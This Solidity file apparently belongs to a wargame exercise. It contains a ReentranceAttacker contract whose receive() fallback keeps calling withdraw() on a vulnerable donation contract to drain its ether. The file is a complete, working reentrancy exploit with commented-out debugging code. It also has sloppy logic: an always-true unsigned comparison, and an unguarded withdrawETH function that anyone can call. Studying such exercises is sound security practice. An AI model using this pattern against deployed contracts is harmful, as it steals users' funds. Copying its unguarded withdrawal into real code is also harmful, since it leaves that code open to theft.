// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import {console, Test} from "@forge-std/Test.sol";

import "@openzeppelin-0_6_x/contracts/utils/Address.sol";
import '@openzeppelin-0_6_x/contracts/math/SafeMath.sol';


interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);

}

contract ReentranceAttacker {
    
    IReentrance reentrance;

    //  uint counter ;
    // uint256 trackedAmount;
    
    constructor(address _reentrance) public {
        reentrance = IReentrance(_reentrance);
    }
    
    function attack() public payable {
        require(msg.value == 0.2 ether);

        // trackedAmount = reentrance.balanceOf(address(this)) ;
        // trackedAmount += 0.2 ether;

        reentrance.donate{value : 0.2 ether}(address(this));

        // trackedAmount += 0.2 ether;
        reentrance.withdraw(0.2 ether);
        // console.log('attack withdraw');

    }

    receive() external payable {

        if (msg.sender != address(reentrance)) return;

        // 0.2 , 10

        uint256 balanceBeforeWithdraw = reentrance.balanceOf(address(this)) ;
        uint256 amountLeft = address(reentrance).balance;

        if(amountLeft >= 0) {
            // amountLeft = 10 < 0.2 = balanceBeforeWithdraw  (false) => 10

            // 0.1 < 0.2 (true) => 0.2
            uint256 amountToWithdraw = amountLeft <= balanceBeforeWithdraw
                ? balanceBeforeWithdraw
                : 0.1 ether;

            // 10
            // trackedAmount -= 0.2 ether;
            reentrance.withdraw(amountToWithdraw);
        }

        // if( (address(reentrance).balance >= 0.1 ether) && (reentrance.balanceOf(address(this)) >= 0.2 ether) ) {
        //     reentrance.withdraw(0.1 ether);
        //     // console.log('payable withdraw');
        //     // counter++;
        //     // console.log(counter);
        // } else {

        // }

        // // if(address(reentrance).balance >= 0 ) {
        // //     reentrance.withdraw(0.1 ether);
        // //     console.log('payable withdraw');
        // //     counter++;
        // //     console.log(counter);
        // // }

    }

    function withdrawETH(address payable to, uint256 amountOut) external  {
        Address.sendValue(to, amountOut);
    }


}